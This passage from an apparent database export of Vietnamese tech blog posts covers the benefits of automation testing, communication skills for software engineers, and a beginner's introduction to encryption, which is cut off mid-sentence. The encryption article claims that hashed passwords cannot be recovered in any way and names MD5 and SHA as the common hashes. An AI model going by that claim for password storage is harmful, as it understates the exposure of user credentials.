gian để đảm bảo rằng sản phẩm web của bạn vẫn ổn định sau mỗi thay đổi được triển khai trong quá trình phát triển.\n\n## **7. Giảm chi phí kinh doanh và sử dụng nhân lực tốt hơn**\n\nĐầu tư ban đầu có thể cao hơn, nhưng các công ty tiết kiệm rất nhiều chi phí khi thực hiện kiểm thử tự động với việc sử dụng tài nguyên hiệu quả. Khi các tập lệnh kiểm thử tự động của bạn đã được thiết lập xong, bạn cần rất ít nhân lực để theo dõi việc thực thi trường hợp kiểm thử một cách thường xuyên và khắc phục sự cố trong trường hợp có bất kỳ lỗi tập lệnh nào. Kiểm thử tự động dẫn đến chất lượng công việc cao hơn, giảm việc sửa chữa các lỗi kĩ thuật sau khi sản phẩm được phát hành. Do đó, chi phí kinh doanh giảm là một trong những lợi ích đáng kể của kiểm thử tự động.\n\n## **8. Shift-Left Testing hoàn thành tốt hơn!**\n\nShift-Left Testing là một phương pháp truyền tải rằng giai đoạn kiểm thử nên được kết hợp vào SDLC (Software Development Life Cycle), ngay từ giai đoạn thu thập yêu cầu để tìm lỗi ở giai đoạn đầu. Shift-Left Testing có thể cải thiện chất lượng sản phẩm của bạn.\n\nLợi ích của kiểm thử tự động là nó có thể được thực hiện ngay khi quá trình phát triển bắt đầu, từ đó phát hiện ra các lỗi hoặc lỗi trước đó, giúp bạn shift-left một cách tốt hơn và nhanh hơn. Chạy thử nghiệm tự động hóa trên các câu chuyện của người dùng để đảm bảo rằng câu chuyện rõ ràng và xác định các xác nhận và ràng buộc mà mọi người thử nghiệm cần phải hiểu. Cách tiếp cận này có thể giúp bạn phát hiện và loại bỏ các lỗi sớm hơn.\n\n## **9. Cải thiện chất lượng kiểm thử thủ công**\n\nCác phần trên đã giải thích về lý do tại sao automation testing tốt hơn manual testing nhưng không ngụ ý rằng automation testing là tất cả những gì bạn cần! Manual testing quan trọng khi đưa ra các kịch bản kiểm thử và trường hợp kiểm thử độc đáo. Các trường hợp kiểm thử thủ công chất lượng sẽ giúp bạn viết các kịch bản kiểm thử tự động chất lượng. Kiểm thử tự động giúp giảm bớt căng thẳng cho manual tester, giúp họ có đủ thời gian và tư duy để đưa ra các kịch bản kiểm thử tốt hơn. Ngoài ra, kiểm thử thủ công đóng vai trò là cơ sở để kiểm thử tự động, một khi bạn thực hiện kiểm thử thủ công, bạn có thể kiểm tra chéo kết quả kiểm thử với sự trợ giúp của các công cụ tự động. Kết quả được tạo từ các công cụ kiểm thử tự động có thể giúp tester nâng cao chất lượng của các kịch bản kiểm thử được viết thủ công.\n\n## **10. Tối đa hóa phạm vi kiểm thử**\n\nKiểm thử thủ công có thể giúp bạn thực hiện nhiều trường hợp kiểm tra chất lượng nhưng khi nói về phạm vi kiểm tra 100% cho một ứng dụng web phức tạp, thực hiện kiểm thử thủ công có thể rất khó khăn. Một trong những lợi ích chính của thử nghiệm tự động hóa là nó có thể giúp bạn tối đa hóa phạm vi kiểm thử của mình. \n\nCác công cụ kiểm thử tự động có thể dễ dàng kiểm tra bằng cách đảm bảo đầu vào và đầu ra của phần mềm như cơ sở dữ liệu, dịch vụ web, giao diện người dùng, v.v. theo yêu cầu nghiệp vụ. Nó sẽ cải thiện phạm vi kiểm thử tổng thể của một ứng dụng web.\n\n## **11. Maximizing ROI**\n\nKiểm thử thủ công mất một lượng thời gian đáng kể để đưa sản phẩm phần mềm ra thị trường do thử nghiệm lặp đi lặp lại. Tuy nhiên, kiểm thử tự động  có thể giúp giảm thời gian kiểm thử và đưa ra một sản phẩm có ít lỗi, bằng cách thực hiện các hành động lặp đi lặp lại với số lượng tài nguyên on-board, ít hơn, từ đó, tối đa hóa lợi tức đầu tư cho doanh nghiệp.\n\n## **12. Tăng tốc kiểm tra trình duyệt chéo**\n\nKiểm thử  trình duyệt chéo thủ công có thể dẫn đến nhiều thách thức và vấn đề. Trong trường hợp kiểm thử thủ công, trước tiên tester phải xác định trình duyệt mà ứng dụng web hỗ trợ. Sau khi chuẩn bị một danh sách tất cả các trình duyệt cần kiểm thử, họ thực hiện một trường hợp kiểm thử duy nhất trên cấu hình trình duyệt và hệ điều hành khác nhau để tính toán effort của họ khi kiểm thử trên ứng dụng web. Đạt được phạm vi kiểm thử đầy đủ giống như một cơn ác mộng. Để chuẩn bị cho mọi người dùng cuối sử dụng trang web của bạn từ trình duyệt lâu đời đến trình duyệt mới nhất, việc kiểm tra trình duyệt chéo bằng cách thủ công dường như là không thể.\n\n\n## **13. Smoke Testing**\n\nThực hiện smoke testing thường xuyên có thể giúp bạn tránh outages  và được khuyến cáo là cách tốt nhất. Tuy nhiên, nhiều tổ chức cuối cùng lại tránh smoke testing vì họ cảm thấy rằng làm như vậy sẽ kết thúc việc nén băng thông của tester. Đây là lý do tại sao thử nghiệm tự động hóa được coi là rất quan trọng. Bạn tạo một bản dựng thử nghiệm tự động dựa trên các kịch bản kiểm thử  ngẫu nhiên của bạn. Bây giờ, bạn có thể dễ dàng thực hiện smoke testing một cách thường xuyên.\n\n## **14. Data Driven Testing**\n\nKiểm thừ hướng dữ liệu là một lợi ích của kiểm thử tự động vì nó cho phép bạn thực hiện các trường hợp kiểm thử của mình để xác thực các chức năng hoạt động bình thường với điều kiện đầu vào của nhiều bộ dữ liệu.\n\n## **15. Thực hiện Distributed Testing**\n\nThực hiện các trường hợp thử nghiệm trên nhiều máy, hệ điều hành hoặc trình duyệt là không khả thi trong trường hợp sử dụng manual testing. Tester có thể thực hiện kiểm tra trên bất kỳ một nền tảng hoặc thiết bị nào tại một thời điểm để phát hiện hành vi của ứng dụng. Các công cụ kiểm thử tự động hỗ trợ thực hiện kiểm thử phân tán bằng cách cho phép các thử nghiệm khác nhau chạy trên các máy tính hoặc thiết bị khác nhau cùng một lúc.\n\n## **16. Khả năng mở rộng**\n\nCó thể mở rộng quy mô kiểm thử thủ công với số lượng người và số giờ nhiều hơn số lượng được phân bổ cho một dự án cụ thể. Càng nhiều trường hợp kiểm thử, bạn sẽ cần càng nhiều người và thời gian hơn để kiểm thử nó. \n\nMặt khác, kiểm thử tự động hóa cung cấp khả năng mở rộng cao vì bạn chỉ cần thêm nhiều người thực hiện kiểm thử trên nền tảng hoặc công cụ kiểm thử.\n\n## **17. Kịch bản kiểm thử phức tạp và nhiều bước**\n\nLợi ích quan trọng cuối cùng của kiểm thử tự động là thực hiện đúng cách các kịch bản kiểm tra dễ bị lỗi, phức tạp và nhiều bước thực hiện mỗi ngày. Có một số trường hợp kiểm thử có thể bao gồm hàng chục bước lặp lại. Các kịch bản như vậy có thể dẫn đến sót lỗi trong trường hợp tester bị phân tâm trong khi thực hiện manual testing. Với kiểm thử tự động, bạn chỉ cần phát triển một kịch bản thử nghiệm đầy đủ và chi tiết một lần, và để mọi thứ tự động thực hiện.\n\n# **Kết luận**\n\nCó thể còn nhiều lợi ích kiểm thử tự động khi ngành công nghiệp đang tiến bộ. Tuy nhiên,những điểm được trình bày ở trên là những lợi ích chính của kiểm thử tự động. \n\nNgoài ra, hãy nhớ rằng kiểm thử thủ công luôn luôn cần thiết để các trường hợp kiểm thử tự động thực hiện tốt hơn. Mặc dù kiểm thử tự động có rất nhiều lợi ịch, nhưng vẫn có khả năng thất bại trong việc đưa dự án về đích đúng thời gian. Điều này có thể xảy ra do nhiều yếu tố nhưng quan trọng nhất và phổ biến nhất là do lựa chọn sai công cụ kiểm thử tự động. Hãy nhớ rằng, kiểm thử tự động phụ thuộc nhiều vào công cụ và có rất nhiều công cụ trên thị trường để lựa chọn. Hãy chắc chắn rằng bạn chọn đúng !\n\n### **Nguồn tham khảo : **\nhttps://www.lambdatest.com/blog/17-key-benefits-of-automation-testing-for-a-successful-release/	Automation Testing là gì?\nAutomation testing là một quá trình kiểm thử gồm một tool tự động thực hiện các trường hợp kiểm thử và các hành động được xác định trước trên một ứng dụng phần mềm. Tool sẽ thực hiện kiểm tra lấy kết quả thực tế và so sánh với kết quả mong muốn để tạo ra báo cáo kết quả kiểm thử chi tiết.\n\nAutomation Testing đòi hỏi một sự đầu tư đáng kể về tài nguyên và tiền bạc, do đ...	{}	1	17 Lợi ích khi sử dụng Automation Testing trước release	{sharpweb}	0	f	2022-12-18 15:33:38.044+00	2022-12-18 15:33:38.044+00
31878	Bài viết được dịch từ [Communication Skills: A Core Part of Software Engineering](https://medium.com/better-programming/communication-skills-a-core-part-of-software-engineering-c7d379cebd66) của tác giả [mayuko](https://medium.com/@mayuko) trên trang Medium. Bản thân tôi thấy bài viết thực sự rất hữu ích, nếu bạn thấy bài chia sẻ này thú vị, vui lòng truy cập vào bài gốc để upvote cho tác giả. Xin cảm ơn.\n\n\n-----\n\nKỹ năng giao tiếp được sử dụng khi viết tài liệu (documentation) cho frameworks và thư viện, hay khi gửi emails hoặc tin nhắn tới các đồng nghiệp. Nó là một yếu tố quan trọng trong cách hai hay nhiều người trao đổi những ý tưởng và định nghĩa phức tạp, cũng chính là phần cốt lõi trong quá trình làm việc nhóm của những người phát triển phần mềm (software developer). Hiện nay, hơn thế nữa, kỹ năng giao tiếp đã trở thành một phần quan trọng trong các cuộc phỏng vấn dành cho software developer, tại đây các công ty  sẽ kiểm tra trình độ tư duy thể hiện trong kỹ năng giao tiếp của ứng viên.\n\nNhưng chúng ta đã gán cho khả năng giao tiếp vào loại kỹ năng mềm, tức là đặt nó xuống tiêu chuẩn hạng hai phía sau phẩm chất về kỹ năng kỹ thuật (technical skills). Có lẽ cái tên "Kỹ năng mềm" cho nó cái cảm giác không quá quan trọng, chỉ là nếu có thì càng tốt. Tuy nhiên, nó lại là một kỹ năng tối cần thiết cho một sự nghiệp thành công trong lĩnh vực công nghệ, do nhu cầu của việc trao đổi những ý tưởng phức tạp tới những nhóm người lớn hơn đang ngày càng đóng vai trò quan trọng trong công việc phát triển phần mềm. Nó cũng là yếu tố quan trọng để làm cho "ngành công nghiệp" công nghệ trở nên dung hòa và lớn mạnh hơn khi cho phép mọi người từ những nền tảng (background) khác nhau có thể làm việc và phối hợp hiệu quả trong các dự án.\n\nKhi chúng ta nhìn vào ngành phát triển phần mềm, chúng ta thường nói rất nhiều về những phát minh và công nghệ tuyệt vời sẽ giúp cho xã hội toàn cầu tiến thêm những bước xa hơn. Nhưng thực tế, chính là con người, những con người thực sự - không phải máy móc, thuật toán hay robots - là chủ thể quyết định cái gì được tạo nên, tạo nên như thế nào, khi nào và ở đâu nó tới được tay của người sử dụng.  Bởi vậy ngành phát triển phần mềm cần thiết phải đòi hỏi kỹ năng của con người để có thể thực hiện được công việc tốt nhất, trong đó kỹ năng giao tiếp đóng vai trò chìa khóa.\n\nHôm nay tôi muốn thảo luận về ba bước với định nghĩa quan trọng có thể giúp tăng khả năng giao tiếp của bạn:\n1.  Bắt đầu bằng việc cải thiện kỹ năng lắng nghe\n2.  Diễn tả những ý tưởng của bạn qua các buổi nói chuyện trước đám đông (public speaking)\n3.  Luôn luôn cố gắng thấu hiểu, thông cảm với người khác\n\nNhững bước này thiết lập một nền tảng lý tưởng cho việc giao tiếp hiệu quả với những người khác. Chúng đều là những kim chỉ nam quan trọng trong sự nghiệp phát triển phát triển phần mềm của chính tôi, và tôi tin những bước này thực sự đã giúp tăng kỹ năng giao tiếp của mình ở giai đoạn khởi đầu.\n\n## Bắt đầu bằng việc lắng nghe\nBước đầu tiên để trở thành một người giao tiếp giỏi đó là học cách lắng nghe.\n\nLà những kỹ sư phát triển phần mềm, chúng tôi hiểu rằng, khi giải quyết một vấn đề, chúng ta cần phải thu thập càng nhiều thông tin càng tốt để có thể đưa đến giải pháp tốt nhất và quyết định đúng đắn nhất. Đây chính là điều kiện tốt nhất để luyện tập cách giải quyết vấn đề cũng như khả năng giao tiếp. Đó là bởi vì sự giao tiếp hiệu quả đạt được khi tất cả các bên bắt đầu thấu hiểu lẫn nhau.\n\nChúng ta đều giao tiếp theo những cách rất khác nhau. Nếu bạ hỏi hai người mô tả về một khái niệm kỹ thuật, gần như chắc chắn rằng họ sẽ sử dụng một tập các từ khác nhau để giải thích về cùng một thứ. Có rất nhiều thứ góp phần vào sự khác nhau trong cách mọi người giao tiếp - khác biệt về ngôn ngữ, giáo dục, địa phương,v.v.\n\nNhưng trong một công việc kỹ thuật cao như kỹ sư phần mềm, điều này sẽ tạo ra một khác biệt lớn trước khi có thể đạt được sự thấu hiểu chung. Sự việc không đồng nhất trong cách hiểu khi triển khai có thể dẫn tới lỗi và bugs (lỗi logic), kéo dài thời gian của dự án, và kéo theo sự thất vọng đến từ việc không thể đạt được những mục tiêu đã kì vọng.\n\nĐể có thể đạt đến sự thấu hiểu lẫn nhau,  việc truyền đạt suy nghĩ của bạn và lắng nghe một cách tỉ mỉ những ý kiến của người khác đều rất quan trọng. Chúng ta thường không đề cập đến kỹ năng lắng nghe như một phần của giao tiếp trong kỹ thuật, bởi vậy hôm nay tôi đưa ra ba cách để các bạn có thể trở thành người lắng nghe tốt hơn:\n\n**1. Phát lại (Playback)**\n\nĐó là khi bạn nghe lời nói của ai đó, dừng, và phát lại chúng theo cái cách mà bạn nghĩ theo ngôn ngữ của chính bạn. Điều này cho bạn cơ hội tự "hấp thụ" và trình bày ý của ai đó theo cách diễn giải của mình, và cũng tạo ra cơ hội để người khác có thể sửa lại ý hiểu của bạn trong trường hợp nó đã bị sai. Đây là một ví dụ:\n\nA: Vậy bạn nghĩ dự án này sẽ mất bao lâu?\n\nB: À thì, phía back-end có lẽ sẽ mất khoảng 3 ngày, và còn một phần phụ thuộc vào team khác, nên có thể mất thêm 2 ngày nữa. UI chắc mất khoảng 6 ngày theo dự đoán của tôi lúc này, và tôi vẫn đang đợi nó được hoàn thành.\n\nA: (Phát lại) Vậy có vẻ như nó sẽ mất ít nhất 9 ngày, tùy thuộc vào mọi người và những team khác phải không?\n\nB: Đúng rồi!\n\nPhần quan trọng ở đây là khi A nói "có nghĩa là" ("it sounds like") - và phía sau là những gì anh ta hiểu theo ngôn ngữ của mình.\n\n**2. Để người khác trình bày xong ý tưởng của họ trước khi khi bạn muốn thêm bất cứ điều gì**\n\nKhi đang ở trong một cuộc trò chuyện với ai đó, hãy chắc là bạn cho đối phương đủ thời gian để họ nói mọi thứ cần nói trước khi bạn tiếp tục câu chuyện. Nếu bạn có một câu hỏi hay ý tưởng nào đó, họ có thể sẽ trả lời câu hỏi hoặc đề cập đến ý tưởng mà bạn đang nghĩ trước khi bạn phải chen vào. Khi bạn cắt ngang một ai đó thì điều đó cũng khá bất lịch sự, và có thể dẫn tới một mối quan hệ không tốt với đồng nghiệp.\n\n**3. Sử dụng những ngôn ngữ cơ thể tích cực**\n\nCó một sự khác biệt khá rõ rệt trong trải nghiệm khi nói chuyện với những người thực sự tham gia vào cuộc hội thoại bằng biểu cảm của cả cơ thể và những người không làm như vậy.\n\nThể hiện biểu cảm  cơ thể cho thấy sự quan tâm đến chủ đề và dẫn tới một cuộc đối thoại hiệu quả và nhiệt tình. Các cách để thể hiện ngôn ngữ cơ thể tích cực bao gồm: giao tiếp bằng mắt một cách thoải mái, tư thế tốt, sử dụng cử chi tay khi nói chuyện, và tập trung vào cuộc đối thoại (ví dụ không sử dụng điện thoại khi nói chuyện với người khác).\n\nĐây đều là những cách tốt để tăng khả năng lắng nghe của bạn - nó giúp bạn giao tiếp hiệu quả với mọi người trong công việc, dự án và trong công ty. Nhưng một phần quan trọng trong phát triển phần mềm khác chính là nói chuyện trước đám đông - cái này không chỉ giới hạn trong các cuộc họp hay cuộc hội đàm, mà còn là các cuộc gặp gỡ trong dự án, trong công ty.\n \n## Diễn tả ý tưởng của bạn trong cách cuộc nói chuyện trước đám đông\nNói chuyện trước đám đông là một kỹ năng quan trọng trong công việc của một kỹ sư phần mềm. Đó là một trong những cách thường gặp để những kỹ sư diễn tả ý tưởng của họ, dù cho là trong  một buổi giới thiệu sản phẩm, tổng quan về kiến trúc hay thậm chí các cuộc báo cáo đứng diễn ra nhanh để cập nhật thông tin dự án, tại đó bạn phải nói chuyện với nhiều người một lúc. Cũng phải chú ý rằng càng tiến sâu hơn trong sự nghiệp, bạn càng tham gia những cuộc nói chuyện với đám đông nhiều hơn, tiếng nói của bạn sẽ lan rộng tới nhiều người và phạm vi công việc của bạn sẽ tăng cả về kích thước cũng như độ phức tạp.\n\nKhi tham gia các buổi như thế, tốt hơn trước hết là phải hình dung một cuộc nói chuyện trước đám đông chuẩn mực sẽ như thế nào. Đặc biệt đối với các buổi nói chuyện về kỹ thuật, thường sẽ đặc trưng bởi:\n* Giao tiếp bằng ánh mắt tốt với thính giả\n* Nói chuyện với âm lượng đủ để mọi người đều nghe rõ\n* Không dùng những từ kiểu "chống đỡ" như "ừm", "ờ" hay "rằng thì là mà" v.v\n* Sử dụng phong thái diễn cảm và ngôn ngữ cơ thể phù hợp\n* Trình bày ngắn gọn, khái quát\n\nNhư vậy rõ ràng là quá nhiều thứ phải nghĩ khi nói, nên điều quan trọng nhất bạn cần phải làm để có thể nói chuyện được tốt hơn trước đám đông là luyện tập. Luyện tập, luyện tập liên tục.\n\nThực hiện phương pháp lặp để phát triển những kỹ năng này cho phép bạn có thể bắt đầu một cách dễ dàng và nhanh chóng, giúp bạn sửa được những lỗi mà bạn mắc phải trong suốt quá trình. Do đó, việc luyện tập cho bạn một bài nói hoàn chỉnh trước khi truyền đạt tới những người khác. Dưới đây là một vài típ giúp bạn có thể tập luyện một cách có mục đích:\n* Tập luyện cho bài nói của bạn một cách trọn vẹn, đừng vội bỏ qua phần nào và sau đó hãy truyền tải nó như những gì mà bạn đã chuẩn bị\n* Luyện tập truyền đạt bài nói ấy ở những khung cảnh khác nhau: tại nhà, nơi làm việc, và quan trọng nhất, trong phòng hoặc nơi tương tự mà bạn sẽ thuyết trình\n* Hãy để ai đó mà bạn tin tưởng lắng nghe bài nói của bạn. Hỏi về phản hồi thực tế của họ và bạn có thể làm điều gì tốt hơn ở những điều mà họ đã gạch ra, nhờ đó bạn có thể sửa và làm tốt hơn cho lần sau\n* Luyện tập thật nhiều. Bạn càng tập nhiều và nhặt nhạnh những sai sót của bản thân thì bạn sẽ càng tiến bộ hơn chỉ trong thời gian ngắn\n\nTiếp theo, chúng ta sẽ chuyển đến một chủ đề nền tảng giúp cải thiện đáng kể sự giao tiếp trong kỹ thuật: Sự thấu hiểu.\n##  Luôn cố gắng thấu hiểu khi giao tiếp\nThấu hiểu là hành động đặt mình vào vị trí của người khác để cố gắng hiểu cảm nhận và suy nghĩ của họ.\n\nĐây là một phần cốt lõi của công việc phát triển phần mềm bởi thứ mà bạn đang làm là cho người khác. Bạn cần phải hiểu nhu cầu của họ về cách họ sử dụng sản phẩm để có thể tạo ra một sản phẩm tốt hơn.\n\nVà, bạn cũng đang tạo ra sản phẩm cùng với những người khác nữa. Bạn sẽ làm việc cùng mọi người ở rất nhiều vai trò khác nhau - product managers, designers, data scientists, managers, cùng các kỹ sư phần mềm khác. Và, tất cả họ từng người sẽ khác hẳn nhau trong cách giao tiếp.\n\nĐặt mình vào vị trí của họ sẽ giúp bạn biết cách để giao tiếp hiệu quả từ đó đạt đến sự đồng thuận, thấu hiểu lẫn nhau.\n\nVậy, làm cách nào để bạn có thể thấu hiểu tốt hơn? Tôi nghĩ đây là sự kết hợp của việc trở thành một người giỏi lắng nghe và việc xây dựng được những mối quan hệ bền vững với những người xung quanh. Tìm hiểu hoàn cảnh của những người khác, những động lực và đam mê của họ sẽ giúp bạn có được một bức tranh lớn hơn về những điều khiến họ trở nên thực sự đặc biệt. Hiểu được nơi mà họ xuất phát giúp bạn thay đổi phong cách nói chuyện cho phù hợp hơn.\n\nVí dụ, nếu ai đó mới đến công ty bạn, bạn sẽ biết là cần phải giải thích các từ viết tắt thường được sử dụng trong nội bộ công ty, bởi vì có lẽ họ chưa biết đến chúng. Thay vào đó, nếu bạn đang nói chuyện với những người mà vai trò của họ không đòi hỏi nền tảng về mặt kỹ thuật, bạn nên chú ý dùng những thuật ngữ dễ hiểu, hoặc giải thích những định nghĩa mà bạn dùng để họ có thể theo kịp.\n\nSử dụng sự thấu hiểu trong giao tiếp không có nghĩa là bạn cần phải trở nên xét nét - điều đó có nghĩa ngược lại. Sẽ hoàn toàn phản tác dụng nếu bạn đánh giá ai đó về những điều họ biết và không biết. Giúp đỡ những người khác để có thể đạt được sự nhận thức chung bằng cách dùng cùng một ngôn ngữ là yếu tố then chốt cho một cuộc nói chuyện thành công.\n\nTất cả các kỹ năng trên đây -lắng nghe, phát biểu trước đám đông, thấu hiểu - có thể thực sự giúp bạn và những người khác có được một nền tảng  nhận thức chung cũng như sự hiểu biết lẫn nhau về các ý tưởng, suy nghĩ và công việc. Đây là phần quan trọng nhất của việc giao tiếp.\n\nLà một cộng đồng công nghệ, chúng ta không nên bỏ qua những kỹ năng này - bởi chúng giúp cho các dự án, các công ty và các tổ chức đi lên phía trước. Giao tiếp là một kỹ năng quan trọng cần được tìm kiếm các cuộc phỏng vấn kỹ năng phần mềm và phải được kỳ vọng nhiều hơn ở những người làm các vai trò kỹ thuật. Bởi vì khi các kỹ sư phần mềm giao tiếp với nhau hiệu quả, những điều tuyệt vời xuất hiện - những thứ tuyệt vời được tạo nên!	Bài viết được dịch từ Communication Skills: A Core Part of Software Engineering của tác giả mayuko trên trang Medium. Bản thân tôi thấy bài viết thực sự rất hữu ích, nếu bạn thấy bài chia sẻ này thú vị, vui lòng truy cập vào bài gốc để upvote cho tác giả. Xin cảm ơn.\n\nKỹ năng giao tiếp được sử dụng khi viết tài liệu (documentation) cho frameworks và thư viện, hay khi gửi emails hoặc tin nhắn tớ...	{}	1	Kĩ năng giao tiếp: Vai trò cốt lõi trong phát triển phần mềm	{soft-skills,communication,software-engineering}	0	f	2022-12-18 15:33:38.079+00	2022-12-18 15:33:38.079+00
31977	# Giới thiệu\nTrong cuộc sống ngày nay, mạng internet có lẻ đã trở thành một thứ không thể thiếu đối với chúng ta. Mạng internet giúp chúng ta tra cứu thông tin, làm việc, học tập, kết nối với mọi người. Nếu thiếu nó thì có lẻ thế giới này sẽ trở lên lạc hậu hơn rất nhiều so với bây giờ.\n\nVậy có bao giờ bạn nghĩ đến thực chất internet là gì, mà tại sao nó lại quan trọng đến vậy? Về cơ bản, ta có thể coi internet như là một môi trường trung gian để trao đổi THÔNG TIN, mọi hoạt động trên internet đều HẦU NHƯ CHỈ xoay quanh việc tiếp nhận, trao đổi và truyền nhận THÔNG TIN. Qua đó ta có thể thấy được thông tin quan trọng như thế nào.\n\nThật sự thông tin còn quan trọng hơn những gì bạn tưởng. Một số thông tin có thể quan trọng hơn bất cứ thứ gì hữu hình trên thế giới này, nó có thể đáng giá hàng trăm tỷ, hàng tỷ tỷ đô la, hoặc có thể là vô giá.\n\nVì thông tin là quan trọng, nên chúng ta sẽ cần phải có những phương pháp để bảo vệ nó.\n\nLưu ý: bài viết dành cho những người mới bắt đầu, chưa biết hoặc chỉ mới biết sơ về mã hóa thông tin.\n\n# Mã hóa là gì?\nHiểu nôm na Mã hóa là phương thức ngụy trang hoặc che giấu một tin nhắn bằng cách áp dụng một số bước lập trình máy tính thành các chuỗi ký tữ đặc biệt để ngăn những người không phận sự tiếp cận vào thông tin đó. Ví dụ: tin nhắn có nội dung như “tôi sẽ gặp anh vào ngày mai tại Hà Nội” được chuyển thành tin nhắn mã hóa như “p98hUls#yeb!”. Làm thế nào để mã hóa được như vậy thì chúng ta cần có thuật toán mã hóa.\n\n# Thuật toán mã hóa\nThuật toán mã hóa là một thuật toán nhằm mã hóa thông tin của chúng ta, biến đổi thông tin từ dạng rõ sang dạng mờ, để ngăn cản việc đọc trộm nội dung của thông tin (Dù hacker có được thông tin đó cũng không hiểu nội dung chứa trong nó là gì).\n\nThông thường các thuật toán sử dụng một hoặc nhiều key (Một chuỗi chìa khóa để mã hóa và giải mã thông tin) để mã hóa và giải mã (Ngoại trừ những thuật toán cổ điển). Bạn có thể coi key này như một cái password để có thể đọc được nội dung mã hóa. Người gửi sẽ dùng key mã hóa để mã hóa thông tin sang dạng mờ, và người nhận sẽ sử dụng key giải mã để giải mã thông tin sang dạng rõ. Chỉ những người nào có key giải mã mới có thể đọc được nội dung.\n\nNhưng đôi khi "kẻ thứ ba" (hacker) không có key giải mã vẫn có thể đọc được thông tin, bằng cách phá vỡ thuật toán. Và có một nguyên tắc là bất kì thuật toán mã hóa nào cũng đều có thể bị phá vỡ. Do đó không có bất kì thuật toán mã hóa nào được coi là an toàn mãi mãi. Độ an toàn của thuật toán được dựa vào nguyên tắc:\n\n> Nếu chi phí để giải mã một khối lượng thông tin lớn hơn giá trị của khối lượng thông tin đó thì thuật toán đó được tạm coi là an toàn. (Không ai lại đi bỏ ra 50 năm để giải mã một thông tin mà chỉ mang lại cho anh ta 1000 đô).\n\n> Nếu thời gian để phá vỡ một thuật toán là quá lớn (giả sử lớn hơn 100 năm, 1000 năm) thì thuật toán được tạm coi là an toàn.\n\n# Phân loại các phương pháp mã hóa\nCó rất nhiều loại phương pháp mã hóa khác nhau đã ra đời. Mỗi loại có những ưu và nhược điểm riêng. Ta có thể phân chia các phương pháp mã hóa thành 4 loại chính:\n\n1. Mã hóa cổ điển\n2. Mã hóa một chiều\n3. Mã hóa đối xứng\n4. Mã hóa bất đối xứng\n\n# 1. Mã hóa cổ điển\nĐây là phương pháp mã hóa đầu tiên, và cố xưa nhất, và hiện nay rất ít được dùng đến so với các phương pháp khác. Ý tưởng của phương pháp này rất đơn giản, bên A mã hóa thông tin bằng thuật toán mã hóa cổ điển, và bên B giải mã thông tin, dựa vào thuật toán của bên A, mà không dùng đến bất kì key nào. Do đó, độ an toàn của thuật toán sẽ chỉ dựa vào độ bí mật của thuật toán, vì chỉ cần ta biết được thuật toán mã hóa, ta sẽ có thể giải mã được thông tin.\n![](https://images.viblo.asia/0d9be7dd-2cb3-4c62-9e97-000b92e76625.jpg)\n\n# 2. Mã hóa một chiều\nĐôi khi ta chỉ cần mã hóa thông tin chứ không cần giải mã thông tin, khi đó ta sẽ dùng đến phương pháp mã hóa một chiều (Chỉ có thể mã hóa chứ không thể giải mã). Thông thường phương pháp mã hóa một chiều sử dụng một hàm băm (hash function) để biến một chuỗi thông tin thành một chuỗi hash có độ dài nhất định. Ta không có bất kì cách nào để khôi phục (hay giải mã) chuỗi hash về lại chuỗi thông tin ban đầu.\n\n> Hàm băm (Hash function) là một hàm mà nó nhận vào một chuỗi có độ dài bất kì, và sinh ra một chuỗi kết quả có độ dài cố định (Gọi là chuỗi hash), dù hai chuỗi dữ liệu đầu vào, được cho qua hàm băm thì cũng sinh ra hai chuỗi hash kết quả khác nhau rất nhiều. Ví dụ như đối với kiểu dữ liệu Hash-table, ta có thể coi đây là một dạng kiểu dữ liệu mảng đặc biệt mà index nó nhận vào là một chuỗi, nó được định nghĩa bằng cách bên trong nó chứa một mảng thông thường, mỗi khi truyền vào index là một chuỗi, thì chuỗi này sẽ đi qua hàm băm và ra một giá trị hash, giá trị này sẽ tương ứng với index thật của phần tử đó trong mảng bên dưới.\n\nĐặc điểm của hash function là khi thực hiên băm hai chuỗi dữ liệu như nhau, dù trong hoàn cảnh nào thì nó cũng cùng cho ra một chuỗi hash duy nhất có độ dài nhất định và thường nhỏ hơn rất nhiều so với chuỗi gốc, và hai chuỗi thông tin bất kì dù khác nhau rất ít cũng sẽ cho ra chuỗi hash khác nhau rất nhiều. Do đó hash function thường được sử dụng để kiểm tra tính toàn vẹn của dữ liệu. \n\nNgoài ra có một ứng dụng mà có thể bạn thường thấy, đó là để lưu giữ mật khẩu. Vì mật khẩu là một thứ cực kì quan trọng, do đó ta không nên lưu mật khẩu của người dùng dưới dạng rõ, vì như vậy nếu bị hacker tấn công, lấy được CSDL thì hacker có thể biết được mật khẩu của người dùng. Do đó, mật khẩu của người dùng nên được lưu dưới dạng chuỗi hash, và đối với server thì chuỗi hash đó chỉnh là “mật khẩu” đăng nhập (lúc đăng nhập thì mật khẩu mà người dùng nhập cũng được mã hóa thành chuỗi hash và so sánh với chuỗi hash trong CSDL của server). Dù hacker có lấy được CSDL thì cũng không tài nào có thể giải mã được chuỗi hash để tìm ra mật khẩu của người dùng.\n\nThuật toán mã hóa một chiều (hàm băm) mà ta thường gặp nhất là MD5 và SHA.\n![](https://images.viblo.asia/b0f0ea48-4c3d-4d74-b078-c83020e9e742.png)\n\n# 3. Mã hóa đối xứng\nMã hóa đối xứng (Hay còn gọi là mã hóa khóa bí mật) là phương pháp mã hóa mà key mã hóa và key giải mã là như nhau (Sử dụng cùng một secret key để mã hóa và giải mã). Đây là phương pháp thông dụng nhất hiện nay dùng để mã hóa dữ liệu truyền nhận giữa hai bên. Vì chỉ cần có secret key là có thể giải mã được, nên bên gửi và bên nhận cần làm một cách nào đó để cùng thống nhất về secret key.\n\nĐể thực hiện mã hóa thông tin giữa hai bên thì:\n\n> Đầu tiên bên gửi và bên nhận bằng cách nào đó sẽ phải thóa thuận secret key (khóa bí mật) được dùng để mã hóa và giải mã. Vì chỉ cần biết được secret key này thì bên thứ ba có thể giải mã được thông tin, nên thông tin này cần được bí mật truyền đi (bảo vệ theo một cách nào đó).\n\n> Sau đó bên gửi sẽ dùng một thuật toán mã hóa với secret key tương ứng để mã hóa dữ liệu sắp được truyền đi. Khi bên nhận nhận được sẽ dùng chính secret key đó để giải mã dữ liệu.\nVấn đề lớn nhất của phương pháp mã hóa đối xứng là làm sao để “thỏa thuận” secret key giữa bên gửi và bên nhận, vì nếu truyền secret key từ bên gửi sang bên nhận mà không dùng một phương pháp bảo vệ nào thì bên thứ ba cũng có thể dễ dàng lấy được secret key này.\n\nCác thuật toán mã hóa đối xứng thường gặp: DES, AES…\n![](https://images.viblo.asia/53960f76-4932-4add-b0d5-86f4c63968a1.png)\n\n# 4. Mã hóa bất đối xứng\nMã hóa bất đối xứng (Hay còn gọi là mã hóa khóa công 